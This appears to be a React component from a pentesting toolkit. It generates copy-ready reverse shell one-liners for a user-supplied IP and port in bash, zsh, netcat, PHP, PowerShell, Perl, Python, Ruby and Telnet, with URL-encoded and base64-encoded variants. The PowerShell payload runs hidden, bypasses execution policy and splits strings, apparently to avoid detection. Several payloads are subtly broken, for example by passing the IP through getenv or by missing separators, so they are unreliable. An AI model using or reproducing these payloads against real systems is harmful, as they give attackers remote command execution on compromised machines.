import React from 'react';
import { Button, message, Typography, Row, Col, Divider, Input } from 'antd';
import { CopyOutlined, WifiOutlined, LinkOutlined, createFromIconfontCN } from '@ant-design/icons';
import PersistedState from 'use-persisted-state';
import QueueAnim from 'rc-queue-anim';
import Clipboard from 'react-clipboard.js';

const { Title, Paragraph } = Typography;
const IconFont = createFromIconfontCN({
	scriptUrl: [ './iconfont.js' ]
});


function ip2int(ip) {
	return ip.split('.').reduce(function(ipInt, octet) { return (ipInt<<8) + parseInt(octet, 10)}, 0) >>> 0;
	}



function ip2hex(ip) {
		
					var ipParts = ip.split('.');
					var p3 = parseInt(ipParts[3],10);
					var p3x = p3.toString(16);
					var p2 = parseInt(ipParts[2],10);
					var p2x = p2.toString(16);
					var p1 = parseInt(ipParts[1],10);
					var p1x = p1.toString(16);
					var p0 = parseInt(ipParts[0],10);
					var p0x = p0.toString(16);
					var dec = p3 + p2 * 256 + p1 * 256 * 256 + p0 * 256 * 256 * 256;
					var hex = dec.toString(16);
					//function pad2 (hex) {
					//	while (hex.length < 2) {
					//		hex = "0" + hex;
					//	}
					//	return hex;
					//}
					//function pad8 (hex) {
					//	while (hex.length < 8) {
					//		hex = "0" + hex;
					//	}
					//	return hex;
					//}
					//hex = "0x" + pad8(hex);
					return '0x'+hex
						
	}


export default (props) => {
	const useIPv4State = PersistedState('ipv4_tcp_cache');
	const [ values, setValues ] = useIPv4State({
		ip: '',
		port: ''
	});
	const handleChange = (name) => (event) => {
		setValues({ ...values, [name]: event.target.value });
	};
	const successInfoReverseShell = () => {
		message.success('Your reverse shell has been copied');
	};
	const successInfoEncodeURL = () => {
		message.success('Reverse shell URI encoded has been copied');
	};

	const successInfoBase64 = () => {
		message.success("Reverse shell base64 encoded has been copied");
	};
	
	const bash_rshell = `bash -c 'exec bash -i &>/dev/tcp/${values.ip}/${values.port} <&1'`;
	const netcat_rshell = `rm /tmp/meh;mkfifo /tmp/meh; nc ${values.ip} ${values.port} 0</tmp/meh | /bin/sh >/tmp/meh 2>&1; rm /tmp/meh`;
	const php_rshell = `php -r '$sock=fsockopen(getenv("${values.ip}"),getenv("${values.port}"));exec("/bin/sh -i <&3 >&3 2>&3");'`;
	const ps = `powershell -W Hidden -noprofile -executionpolicy bypass -NoExit -c `;
	const PS_rshell = `"$tmp = @('sYSteM.nEt.sOc','KEts.tCPClIent');$tmp2 = [String]::Join('',$tmp);$client = New-Object $tmp2('${values.ip}',${values.port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ($env:UserName) + '@' + ($env:UserDomain) + ([System.Environment]::NewLine) + (get-location)+'>';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`;
	let ps16 = Buffer.from(PS_rshell.replace(/\"/g, ""), 'utf16le')
	const perl_rshell = `perl -e 'use Socket;$i="$ENV{${values.ip}}";$p=$ENV{${values.port}};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
	const python_rshell = `python -c 'import sys,socket,os,pty;s=socket.socket()s.connect((os.getenv("${values.ip}"),int(os.getenv("${values.port}"))))[os.dup2(s.fileno(),fd) for fd in (0,1,2)]pty.spawn("/bin/sh")'`;
	const ruby_rshell = `ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["${values.ip}"],ENV["${values.port}"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`;
	const telnet_rshell = `TF=$(mktemp -u); mkfifo $TF && telnet ${values.ip} ${values.port} 0<$TF | /bin sh 1>$TF`;
	const zsh_rshell = `zsh -c 'zmodload zsh/net/tcp && ztcp ${values.ip} ${values.port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'`

	return (
		<QueueAnim delay={300} duration={1500}>
			<Title variant='Title level={3}' style={{ fontWeight: 'bold', margin: 15 }}>
				Reverse shell
			</Title>
			<Paragraph style={{ margin: 15 }}>
				Enhanced Hacking Tools
			</Paragraph>
			<div style={{ padding: 15 }}>
				<Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
					<Col span={12}>
						<Input
							maxLength={15}
							prefix={<WifiOutlined />}
							name='Ip adress'
							placeholder='IP Address or domain (ex: 212.212.111.222)'
							onChange={handleChange('ip')}
							value={values.ip}
						/>
						IP as Long Integer:	<Paragraph copyable ellipsis={true}>
						{ip2int(values.ip)}
						</Paragraph>
						IP as Hexadecimal: <Paragraph copyable ellipsis={true}>
							{ip2hex(values.ip)}
							</Paragraph>
					</Col>
					<Col span={12}>
						<Input
							maxLength={5}
							prefix={<IconFont type='icon-Network-Plug' />}
							name='Port'
							placeholder='Port (ex: 1337)'
							onChange={handleChange('port')}
							value={values.port}
						/>
					</Col>
				</Row>
			</div>
			<Divider dashed />
			<div style={{ padding: 10, marginTop: 15 }} key='a'>
				<Title level={3}>
					Bash <IconFont type='icon-gnubash' />
				</Title>
				<Paragraph copyable editable ellipsis={true}>
					{bash_rshell}
				</Paragraph>
				<Clipboard component='a' data-clipboard-text={bash_rshell}>
					<Button
						type='primary'
						onClick={successInfoReverseShell}
						style={{ marginBottom: 10, marginTop: 15 }}
					>
						<CopyOutlined /> Copy the reverse shell
					</Button>
				</Clipboard>
				<Clipboard component='a' data-clipboard-text={encodeURI(bash_rshell)}>
					<Button
						type='dashed'
						onClick={successInfoEncodeURL}
						style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
					>
						<LinkOutlined /> URL encoded
					</Button>
				</Clipboard>
			</div>
			<Divider dashed />
			<div style={{ padding: 10, marginTop: 15 }} key='a'>
				<Title level={3}>
					Zsh <IconFont type='icon-command-line' />
				</Title>
				<Paragraph copyable editable ellipsis={true}>
					{zsh_rshell}
				</Paragraph>
				<Clipboard component='a' data-clipboard-text={zsh_rshell}>
					<Button
						type='primary'
						onClick={successInfoReverseShell}
						style={{ marginBottom: 10, marginTop: 15 }}
					>
						<CopyOutlined /> Copy the reverse shell
					</Button>
				</Clipboard>
				<Clipboard component='a' data-clipboard-text={encodeURI(zsh_rshell)}>
					<Button
						type='dashed'
						onClick={successInfoEncodeURL}
						style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
					>
						<LinkOutlined /> URL encoded
					</Button>
				</Clipboard>
			</div>
			<Divider dashed />
			<div style={{ padding: 10, marginTop: 15 }} key='b'>
				<Title level={3}>
					Netcat <IconFont type='icon-command-line' />
				</Title>
				<Paragraph editable copyable ellipsis={true}>
					{netcat_rshell}
				</Paragraph>
				<Clipboard component='a' data-clipboard-text={netcat_rshell}>
					<Button
						type='primary'
						onClick={successInfoReverseShell}
						style={{ marginBottom: 10, marginTop: 15 }}
					>
						<CopyOutlined /> Copy the reverse shell
					</Button>
				</Clipboard>
				<Clipboard component='a' data-clipboard-text={encodeURI(netcat_rshell)}>
					<Button
						type='dashed'
						onClick={successInfoEncodeURL}
						style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
					>
						<LinkOutlined /> URL encoded
					</Button>
				</Clipboard>
				<Clipboard component='a' data-clipboard-text={btoa(netcat_rshell)}>
					<Button
						type='dashed'
						onClick={successInfoBase64}
						style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
					>
						<LinkOutlined /> Base64-encoded
					</Button>
				</Clipboard>
			</div>
			<Divider dashed />
			<div
				key='c'
				style={{
					padding: 15,
					marginTop: 15
				}}
			>
				<Title level={3}>
					PHP <IconFont type='icon-php' />
				</Title>
				<Paragraph editable copyable ellipsis={true}>
					{php_rshell}
				</Paragraph>
				<Clipboard component='a' data-clipboard-text={php_rshell}>
					<Button
						type='primary'
						onClick={successInfoReverseShell}
						style={{ marginBottom: 10, marginTop: 15 }}
					>
						<CopyOutlined />
						Copy the reverse shell
					</Button>
				</Clipboard>
				<Clipboard component='a' data-clipboard-text={encodeURI(php_rshell)}>
					<Button
						type='dashed'
						onClick={successInfoEncodeURL}
						style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
					>
						<LinkOutlined /> URL encoded
					</Button>
				</Clipboard>
			</div>

			<Divider dashed />
			<div style={{ padding: 10, marginTop: 15 }} key='a'>
				<Title level={3}>
					PowerShell <IconFont type='icon-powershell' />
				</Title>
				<Paragraph editable copyable ellipsis={true}>
					{ps+PS_rshell}
				</Paragraph>
				<Clipboard component='a' data-clipboard-text={ps+PS_rshell}>
					<Button
						type='primary'
						onClick={successInfoReverseShell}
						style={{ marginBottom: 10, marginTop: 15 }}
					>
						<CopyOutlined /> Copy the reverse shell
					</Button>
				</Clipboard>
				<Clipboard component='a' data-clipboard-text={encodeURI(PS_rshell)}>
					<Button
						type='dashed'
						onClick={successInfoEncodeURL}
						style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
					>
						<LinkOutlined /> URL encoded
					</Button>
				</Clipboard>
				<Clipboard component='a' data-clipboard-text={ps.replace("-c","-e")+btoa(ps16)}>
					<Button
						type='dashed'
						onClick={successInfoBase64}
						style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
					>
						<LinkOutlined /> Base64-encoded
					</Button>
				</Clipboard>
			</div>
			<div
				key='d'
				style={{
					padding: 15,
					marginTop: 15
				}}
			>
				<Divider dashed />
				<Title level={3}>
					Perl <IconFont type='icon-perl' />
				</Title>
				<Paragraph editable copyable ellipsis={true}>
					{perl_rshell}
				</Paragraph>
				<Clipboard component='a' data-clipboard-text={perl_rshell}>
					<Button
						type='primary'
						onClick={successInfoReverseShell}
						style={{ marginBottom: 10, marginTop: 15 }}
					>
						<CopyOutlined />
						Copy the reverse shell
					</Button>
				</Clipboard>
				<Clipboard component='a' data-clipboard-text={encodeURI(perl_rshell)}>
					<Button
						type='dashed'
						onClick={successInfoEncodeURL}
						style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
					>
						<LinkOutlined /> URL encoded
					</Button>
				</Clipboard>
			</div>
			<Divider dashed />
			<div
				key='e'
				style={{
					padding: 15,
					marginTop: 15
				}}
			>
				<Title level={3}>
					Python <IconFont type='icon-python' />
				</Title>
				<Paragraph editable copyable ellipsis={true}>
					{python_rshell}
				</Paragraph>
				<Clipboard component='a' data-clipboard-text={python_rshell}>
					<Button
						type='primary'
						onClick={successInfoReverseShell}
						style={{ marginBottom: 10, marginTop: 15 }}
					>
						<CopyOutlined />
						Copy the reverse shell
					</Button>
				</Clipboard>
				<Clipboard component='a' data-clipboard-text={encodeURI(python_rshell)}>
					<Button
						type='dashed'
						onClick={successInfoEncodeURL}
						style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
					>
						<LinkOutlined /> URL encoded
					</Button>
				</Clipboard>
			</div>
			<Divider dashed />
			<div
				key='f'
				style={{
					padding: 15,
					marginTop: 15
				}}
			>
				<Title level={3}>
					Ruby <IconFont type='icon-ruby' />
				</Title>
				<Paragraph editable copyable ellipsis={true}>
					{ruby_rshell}
				</Paragraph>
				<Clipboard component='a' data-clipboard-text={ruby_rshell}>
					<Button
						type='primary'
						onClick={successInfoReverseShell}
						style={{ marginBottom: 10, marginTop: 15 }}
					>
						<CopyOutlined />
						Copy the reverse shell
					</Button>
				</Clipboard>
				<Clipboard component='a' data-clipboard-text={encodeURI(ruby_rshell)}>
					<Button
						type='dashed'
						onClick={successInfoEncodeURL}
						style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
					>
						<LinkOutlined /> URL encoded
					</Button>
				</Clipboard>
			</div>
			<Divider dashed />
			<div style={{ padding: 15, marginTop: 15 }} key='g'>
				<Title level={3}>
					Telnet <IconFont type='icon-lvzhou_yuanchengTelnet' />
				</Title>
				<Paragraph editable copyable ellipsis={true}>
					{telnet_rshell}
				</Paragraph>
				<Clipboard component='a' data-clipboard-text={telnet_rshell}>
					<Button
						type='primary'
						onClick={successInfoReverseShell}
						style={{ marginBottom: 10, marginTop: 15 }}
					>
						<CopyOutlined />
						Copy the reverse shell
					</Button>
				</Clipboard>
				<Clipboard component='a' data-clipboard-text={encodeURI(telnet_rshell)}>
					<Button
						type='dashed'
						onClick={successInfoEncodeURL}
						style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
					>
						<LinkOutlined /> URL encoded
					</Button>
				</Clipboard>
			</div>
		</QueueAnim>
	);
};
